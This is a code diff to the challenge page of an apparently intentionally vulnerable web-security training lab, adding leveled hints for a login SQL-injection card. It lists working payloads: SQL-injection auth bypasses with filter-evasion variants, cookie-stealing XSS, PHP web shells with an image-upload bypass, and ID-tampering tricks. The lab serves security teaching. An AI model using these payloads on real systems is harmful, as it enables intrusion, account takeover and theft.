@@ -44,17 +44,19 @@ footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted
 
 <!-- Login: SQLi bypass + weak creds -->
 <div class="card"><h2><code>login.php</code> <span class="flag-pill">🏁 SQLi auth-bypass</span> <span class="flag-pill">weak creds</span></h2>
-  <p class="muted">Log in without a password (inject), or with guessed creds.</p>
-  <details><summary>💡 hint</summary><code class="pl" id="pl_lu">admin'-- -</code>
-    <button type="button" class="ghost" onclick="document.getElementById('in_lu').value=document.getElementById('pl_lu').textContent;document.getElementById('in_lp').value='x'">use this ▶</button>
+  <p class="muted">Log in without a password — inject the <b>username</b> field. The filter escalates per level.</p>
+  <div class="levels" id="lv_login"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('login','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('login','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('login','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('login','expert')">Expert</button></div>
+  <details><summary>💡 hint — <span class="note" id="note_login"></span></summary><code class="pl" id="pl_login"></code>
+    <button type="button" class="ghost" onclick="document.getElementById('in_lu').value=document.getElementById('pl_login').textContent;document.getElementById('in_lp').value='x';document.getElementById('in_lu').dispatchEvent(new Event('input'))">use this ▶</button>
     <span class="muted"> · or weak creds <code>admin : S3ntinel!Admin</code></span></details>
   <form method="post" action="login.php?embed=1" target="r_login" onsubmit="show('r_login')">
+    <input type="hidden" name="level" id="lvl_login" value="easy">
     <input type="text" id="in_lu" name="username" placeholder="username" style="min-width:140px">
     <input type="text" id="in_lp" name="password" placeholder="password" style="min-width:140px"><button>Login ▶</button></form>
   <iframe name="r_login" id="r_login" class="res"></iframe></div>
 
 <!-- Search: UNION SQLi (leveled) -->
-<div class="card"><h2><code>index.php?q=</code> <span class="flag-pill">🏁 UNION SQLi</span></h2>
+<div class="card"><h2><code>home.php?q=</code> <span class="flag-pill">🏁 UNION SQLi</span></h2>
   <p class="muted">Two bugs share this box. <b>SQLi</b> (use SQLi ▶) → read the <b>✓/✗ match</b> result below (expert is blind). <b>Reflected XSS</b> (use XSS ▶) → the payload breaks out of the search field and an <b>alert pops</b>; ignore the match line. Both filters escalate per level.</p>
   <div class="levels" id="lv_q"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('q','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('q','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('q','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('q','expert')">Expert</button></div>
   <details><summary>💡 hint — <span class="note" id="note_q"></span></summary>
@@ -105,7 +107,7 @@ footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted
   <iframe name="r_cmd" id="r_cmd" class="res"></iframe></div>
 
 <!-- Page: LFI (leveled) -->
-<div class="card"><h2><code>index.php?page=</code> <span class="flag-pill">🏁 LFI / path traversal</span></h2>
+<div class="card"><h2><code>home.php?page=</code> <span class="flag-pill">🏁 LFI / path traversal</span></h2>
   <p class="muted">Includes <code>pages/&lt;name&gt;</code>. Read <code>lfi_secret/flag.txt</code> (outside the web root). Filter escalates.</p>
   <div class="levels" id="lv_pg"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('pg','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('pg','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('pg','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('pg','expert')">Expert</button></div>
   <details><summary>💡 hint — <span class="note" id="note_pg"></span></summary>
@@ -179,6 +181,7 @@ PAYLOADS.q.expert.x='"><svg><animate onbegin=alert(1) attributeName=x dur=1s>';
 PAYLOADS.gb={easy:{p:"<script>alert(document.cookie)<\/script>",n:"Easy — raw render."},medium:{p:"<img src=x onerror=alert(document.cookie)>",n:"Medium — '<script' stripped once → <img onerror>."},hard:{p:"<svg onload=alert(document.cookie)>",n:"Hard — onerror also stripped → <svg onload>."},expert:{p:"<svg><animate onbegin=alert(document.cookie) attributeName=x dur=1s>",n:"Expert — onload also stripped → <svg><animate onbegin>."}};
 PAYLOADS.id={easy:{p:"1",n:"Easy — raw id, just change it."},medium:{p:"MQ==",n:"Medium — id is base64-encoded. MQ== = base64 of 1."},hard:{p:"c4ca4238a0b923820dcc509a6f75849b",n:"Hard — id is md5(real id). This string is md5 of 1."},expert:{p:"(id ignored — set cookie uid=1)",n:"Expert — the ?id is ignored; the app trusts a uid cookie. DevTools → Application → Cookies → add uid=1, then Run."}};
 PAYLOADS.up={easy:{p:"<\x3Fphp system($_GET['cmd']); ?\x3E",n:"Easy — no checks."},medium:{p:"<\x3Fphp system($_GET['cmd']); ?\x3E",n:"Medium — content-type must be image/* (sent as image/gif for you)."},hard:{p:"GIF89a<\x3Fphp system($_GET['cmd']); ?\x3E",n:"Hard — content must start with GIF89a magic bytes (prefixed)."},expert:{p:"GIF89a<\x3Fphp passthru($_GET['cmd']); ?\x3E",n:"Expert — the word 'system' is blocked → passthru()."}};
+var _ready=false;
 function setLvl(card,lvl){
   var Ld=document.getElementById('lvl_'+card); if(Ld) Ld.value=lvl;
   var d=PAYLOADS[card][lvl];
@@ -187,9 +190,13 @@ function setLvl(card,lvl){
   var nt=document.getElementById('note_'+card); if(nt) nt.textContent=d.n;
   var plx=document.getElementById('pl_'+card+'x'); if(plx && d.x) plx.textContent=d.x;
   if(card==='cmd'){ var s2=document.getElementById('cmd_step2'); if(s2) s2.style.display=(lvl==='expert')?'block':'none'; }
+  var _inp=document.getElementById('in_'+card); if(_ready && _inp && card!=='up'){ _inp.value=d.p; try{_inp.dispatchEvent(new Event('input'));}catch(e){} }
+  if(card==='login' && _ready){ var lu=document.getElementById('in_lu'); if(lu){ lu.value=d.p; document.getElementById('in_lp').value='x'; lu.dispatchEvent(new Event('input')); } }
   document.querySelectorAll('#lv_'+card+' .lvlbtn').forEach(function(b){ b.classList.toggle('on', b.getAttribute('data-l')===lvl); });
 }
-['q','cmd','pg','gb','id','up'].forEach(function(c){ setLvl(c,'easy'); });
+PAYLOADS.login={easy:{p:"admin'-- -",n:"Easy — comment out the password check."},medium:{p:"admin' or '1'='1",n:"Medium — comments stripped -> self-closing OR (no comment)."},hard:{p:"admin' oorr '1'='1",n:"Hard — 'or' also stripped -> nest it (oorr -> or)."},expert:{p:"admin'/**/oorr/**/'1'='1",n:"Expert — spaces also stripped -> /**/ as spaces."}};
+['q','cmd','pg','gb','id','up','login'].forEach(function(c){ setLvl(c,'easy'); });
+_ready=true;
 // Accordion: collapse every challenge card; click a title to open it (closes the others).
 document.querySelectorAll('.wrap > .card').forEach(function(card){
   var h=card.querySelector('h2'); if(!h) return;
@@ -206,12 +213,15 @@ document.querySelectorAll('.wrap > .card').forEach(function(card){
 });
 var first=document.querySelector('.card.chal'); if(first) first.classList.add('open');  // open the first
 // Live URL preview under each GET form input (shows WHERE the payload goes).
-document.querySelectorAll('form[method="get"]').forEach(function(f){
-  var inp=f.querySelector('input[type="text"]'); if(!inp||!inp.name) return;
+document.querySelectorAll('form').forEach(function(f){
+  var named=[]; f.querySelectorAll('input[type="text"],textarea').forEach(function(i){ if(i.name) named.push(i); });
+  if(!named.length) return;
+  var method=(f.getAttribute('method')||'get').toUpperCase();
+  var act=(f.getAttribute('action')||'').split('?')[0]||'(this page)';
   var pv=document.createElement('div'); pv.className='urlprev'; f.appendChild(pv);
-  var act=f.getAttribute('action')||'';
-  function upd(){ pv.textContent='→ GET '+act+'?'+inp.name+'='+inp.value; }
-  inp.addEventListener('input',upd); upd();
+  function upd(){ var qs=named.map(function(i){return i.name+'='+i.value;}).join('&');
+    pv.textContent=(method==='GET')?('→ GET '+act+'?'+qs):('→ POST '+act+'   body: '+qs); }
+  named.forEach(function(i){ i.addEventListener('input',upd); }); upd();
 });
 function doUpload(){
   var out=document.getElementById('r_up'); out.style.display='block'; out.textContent='uploading…';
